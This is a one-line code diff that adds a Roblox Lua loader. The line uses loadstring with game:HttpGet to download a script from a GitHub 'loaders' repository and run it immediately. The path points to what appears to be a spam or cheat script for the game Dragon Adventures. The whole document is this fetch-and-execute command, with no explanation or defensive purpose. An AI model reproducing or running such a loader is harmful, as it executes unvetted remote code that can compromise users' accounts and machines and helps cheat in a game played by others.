@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BudgieRectifier/loaders/main/loaders/dragon-adventures-spam1-w1aujnzoikct3n.lua"))()
